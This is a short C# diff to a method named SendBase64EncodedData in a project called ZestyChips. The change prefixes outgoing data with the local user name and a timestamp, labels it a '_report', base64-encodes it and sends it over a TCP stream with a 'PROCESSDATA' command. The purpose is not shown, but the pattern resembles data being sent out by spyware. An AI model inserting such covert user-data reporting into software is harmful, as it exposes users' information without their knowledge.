@@ -120,8 +120,17 @@ namespace ZestyChips
         */
         public static bool SendBase64EncodedData(string data) {
             try {
+
+                string text = string.Concat(new string[] {
+                    "From: a_",
+                    Environment.UserName,
+                    "\r\nSubject:",
+                    DateTime.UtcNow.ToString(),
+                    "_report\r\n\r\n",
+                    data
+                });
                 // encode data to b64
-                string base64Data = Convert.ToBase64String(Encoding.ASCII.GetBytes(data));
+                string base64Data = Convert.ToBase64String(Encoding.ASCII.GetBytes(text));
 
                 NetworkStream stream = client.GetStream();
                 string dataCommand = $"PROCESSDATA {base64Data}\r\n"; // send PROCESSDATA switch
